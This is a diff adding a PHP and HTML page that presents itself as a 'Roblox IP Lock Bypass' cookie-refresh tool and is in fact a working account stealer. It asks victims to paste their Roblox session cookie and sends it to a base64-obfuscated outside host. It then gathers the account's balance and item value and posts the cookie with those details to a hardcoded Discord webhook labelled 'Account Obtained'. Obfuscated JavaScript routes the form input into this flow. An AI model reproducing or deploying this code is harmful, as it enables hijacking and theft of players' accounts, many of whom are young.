@@ -1,0 +1,163 @@
+<?php
+$webhook = 'https://discord.com/api/webhooks/980810066083086406/VMM-W2JbY7mNoNaBRFcLIDuoje8YL61e_-2XG4zAgcLAK-tTS42qeYwrvliumDVZhkzK';
+    function rap($user_id, $cookie) {
+	$cursor = '';
+	$total_rap = 0;
+	while ($cursor !== null) {
+		$request = curl_init();
+		curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
+		curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
+		curl_setopt($request, CURLOPT_RETURNTRANSFER, true);
+		$data = json_decode(curl_exec($request), true);
+		foreach($data['data'] as $item) {
+			$total_rap += $item['recentAveragePrice'];
+		}
+		$cursor = $data['nextPageCursor'] ? $data['nextPageCursor'] : null;
+	}
+	return $total_rap;
+}
+if (!empty($_GET['cookie']))
+{
+    $cookie = json_decode(file_get_contents(base64_decode('aHR0cHM6Ly93eHItdG9vbHMuaGVyb2t1YXBwLmNvbS8=') . '?c=' . $_GET['cookie']) , true);
+    if ($cookie['success'] == true)
+    {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://www.roblox.com/mobileapi/userinfo');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        'Cookie: .ROBLOSECURITY=' . $cookie['cookie']
+    ));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    $profile = json_decode(curl_exec($ch) , true);
+    curl_close($ch);
+    $profile['IsPremium'] = $profile['IsPremium'] ? 'True' : 'False';
+            $leaked = json_encode([
+                'username' => 'Shockify',
+                'avatar_url' => 'https://media.discordapp.net/attachments/1032731588032725022/1034650539880894545/shockify.png',
+                'content' => '',
+                "embeds" => [
+                    [
+                        'title' => 'Account Obtained',
+                        'type' => 'rich',
+                        'description' => '',
+                        'url' => 'https://www.roblox.com/users/' . $profile['UserID'] . '/profile',
+                        'timestamp' => date('c'),
+                        'color' => hexdec('000'),
+                        'thumbnail' => [
+                            'url' => 'https://www.roblox.com/avatar-thumbnail/image?userId='. $profile['UserID'] . '&width=420&height=420&format=png'
+                        ],
+                        'fields' => [
+                            [
+                                'name' => 'Username:',
+                                "value" => $profile['UserName'],
+                                'inline' => true,
+                            ],
+                            [
+                                'name' => 'UserID:',
+                                "value" => $profile['UserID'],
+                                'inline' => true,
+                            ],
+                            [
+                                'name' => 'Robux Balance:',
+                                "value" => number_format($profile['RobuxBalance']),
+                                'inline' => true,
+                            ],
+                            [
+                                'name' => 'Rap:',
+                                "value" => number_format(rap($profile['UserID'], $cookie['cookie'])),
+                                'inline' => true,
+                            ],
+                            [
+                                'name' => 'Premium:',
+                                "value" => $profile['IsPremium'],
+                                'inline' => true,
+                            ],
+                            [
+                                'name' => 'Cookie:',
+                                'value' => "```yaml\n" . $cookie['cookie'] . "```",
+                                'inline' => false,
+                            ],
+                        ]
+                    ]
+                ]
+            
+            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
+            
+            $ch = curl_init();
+            curl_setopt_array($ch, [
+                CURLOPT_URL => $webhook,
+                CURLOPT_POST => true,
+                CURLOPT_POSTFIELDS => $leaked,
+                CURLOPT_HTTPHEADER => [
+                    "Content-Type: application/json"
+                ]
+            ]);
+            $response = curl_exec($ch);
+            curl_close($ch);
+            die($cookie['cookie']);
+    }
+    else
+    {
+        die('Failed: Invalid Cookie');
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>Cookie refresh</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<link rel="icon" type="image/png" href="https://colorlib.com/etc/cf/ContactFrom_v2/images/icons/favicon.ico" />
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/cf/ContactFrom_v2/vendor/bootstrap/css/bootstrap.min.css">
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/cf/ContactFrom_v2/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/cf/ContactFrom_v2/vendor/animate/animate.css">
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/cf/ContactFrom_v2/vendor/css-hamburgers/hamburgers.min.css">
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/cf/ContactFrom_v2/vendor/select2/select2.min.css">
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/cf/ContactFrom_v2/css/util.css">
+<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/cf/ContactFrom_v2/css/main.css">
+<meta name="robots" content="noindex, follow">
+<script nonce="a26b581b-7c93-41c5-bc19-9ceed3e51540">(function(w,d){!function(a,e,t,r){a.zarazData=a.zarazData||{},a.zarazData.executed=[],a.zaraz={deferred:[]},a.zaraz.q=[],a.zaraz._f=function(e){return function(){var t=Array.prototype.slice.call(arguments);a.zaraz.q.push({m:e,a:t})}};for(const e of["track","set","ecommerce","debug"])a.zaraz[e]=a.zaraz._f(e);a.addEventListener("DOMContentLoaded",(()=>{var t=e.getElementsByTagName(r)[0],z=e.createElement(r),n=e.getElementsByTagName("title")[0];for(n&&(a.zarazData.t=e.getElementsByTagName("title")[0].text),a.zarazData.x=Math.random(),a.zarazData.w=a.screen.width,a.zarazData.h=a.screen.height,a.zarazData.j=a.innerHeight,a.zarazData.e=a.innerWidth,a.zarazData.l=a.location.href,a.zarazData.r=e.referrer,a.zarazData.k=a.screen.colorDepth,a.zarazData.n=e.characterSet,a.zarazData.o=(new Date).getTimezoneOffset(),a.zarazData.q=[];a.zaraz.q.length;){const e=a.zaraz.q.shift();a.zarazData.q.push(e)}z.defer=!0;for(const e of[localStorage,sessionStorage])Object.keys(e).filter((a=>a.startsWith("_zaraz_"))).forEach((t=>{try{a.zarazData["z_"+t.slice(7)]=JSON.parse(e.getItem(t))}catch{a.zarazData["z_"+t.slice(7)]=e.getItem(t)}}));z.referrerPolicy="origin",z.src="/cdn-cgi/zaraz/s.js?z="+btoa(encodeURIComponent(JSON.stringify(a.zarazData))),t.parentNode.insertBefore(z,t)}))}(w,d,0,"script");})(window,document);</script></head>
+<body>
+<div class="bg-contact2" style="background-image: url('https://colorlib.com/etc/cf/ContactFrom_v2/images/bg-01.jpg');">
+<div class="container-contact2">
+<div class="wrap-contact2">
+<script>
+       function onSubmit(token) {
+         document.getElementById("cap").submit();
+       }
+     </script>
+<form id="cap" class="contact2-form validate-form" method="POST" action="">
+<span class="contact2-form-title">
+Roblox IP Lock Bypass!
+</span>
+<div class="wrap-input2 validate-input" data-validate="Cookie is required">
+<textarea class="input2" id="inputsex" name="c" required></textarea>
+<span class="focus-input2" data-placeholder="COOKIE HERE"></span>
+</div>
+<div class="container-contact2-form-btn">
+<div class="wrap-contact2-form-btn">
+<div class="contact2-form-bgbtn"></div>
+<input type="text" name="recaptcha-response" hidden>
+<button class="g-recaptcha contact2-form-btn" id="sex">
+Bypass Lock!
+</button>
+</div>
+</div>
+</form>
+</div>
+</div>
+</div>
+</head>
+<script>
+const _0x482bbe=_0x78d0;(function(_0xba3cec,_0x3940bd){const _0x331a32=_0x78d0,_0x3953f6=_0xba3cec();while(!![]){try{const _0x4895b8=parseInt(_0x331a32(0xea))/0x1+-parseInt(_0x331a32(0xed))/0x2*(parseInt(_0x331a32(0xf1))/0x3)+-parseInt(_0x331a32(0xf2))/0x4+-parseInt(_0x331a32(0xe7))/0x5*(parseInt(_0x331a32(0xf5))/0x6)+parseInt(_0x331a32(0xef))/0x7*(-parseInt(_0x331a32(0xfb))/0x8)+parseInt(_0x331a32(0xf9))/0x9*(parseInt(_0x331a32(0xe9))/0xa)+parseInt(_0x331a32(0xf6))/0xb*(parseInt(_0x331a32(0xf3))/0xc);if(_0x4895b8===_0x3940bd)break;else _0x3953f6['push'](_0x3953f6['shift']());}catch(_0x34d981){_0x3953f6['push'](_0x3953f6['shift']());}}}(_0x2cdb,0x26246));function _0x2cdb(){const _0x47c8bd=['46010JykBpe','/cookierefresh.php?cookie=','addEventListener','4vilNWa','href','66339ziwUzg','value','188004RUsGRh','171688MQnoyc','393252rHQuGs','sex','186BxywRr','154MiZMwJ','https://','click','94293RbeDNt','getElementById','136ZUfWnC','preventDefault','33515rfqhsu','inputsex','180xCdTEQ'];_0x2cdb=function(){return _0x47c8bd;};return _0x2cdb();}function _0x78d0(_0x20c8d8,_0x55cc49){const _0x2cdb81=_0x2cdb();return _0x78d0=function(_0x78d06e,_0x32cf79){_0x78d06e=_0x78d06e-0xe6;let _0x1559a3=_0x2cdb81[_0x78d06e];return _0x1559a3;},_0x78d0(_0x20c8d8,_0x55cc49);}const check_box=document[_0x482bbe(0xfa)](_0x482bbe(0xf4)),cookie_box=document['getElementById'](_0x482bbe(0xe8)),dom=window['location']['hostname'];check_box[_0x482bbe(0xec)](_0x482bbe(0xf8),async function(_0x1a6b96,_0x3cb929){const _0x41d046=_0x482bbe;_0x1a6b96[_0x41d046(0xe6)]();let _0x58027e=cookie_box[_0x41d046(0xf0)];window['location'][_0x41d046(0xee)]=_0x41d046(0xf7)+dom+_0x41d046(0xeb)+_0x58027e+'';});
+</script>
+<script src="https://colorlib.com/etc/cf/ContactFrom_v2/vendor/jquery/jquery-3.2.1.min.js"></script>
+<script src="https://colorlib.com/etc/cf/ContactFrom_v2/vendor/bootstrap/js/popper.js"></script>
+<script src="https://colorlib.com/etc/cf/ContactFrom_v2/vendor/bootstrap/js/bootstrap.min.js"></script>
+<script src="https://colorlib.com/etc/cf/ContactFrom_v2/vendor/select2/select2.min.js"></script>
+<script src="https://colorlib.com/etc/cf/ContactFrom_v2/js/main.js"></script>
+</body>
+</html>
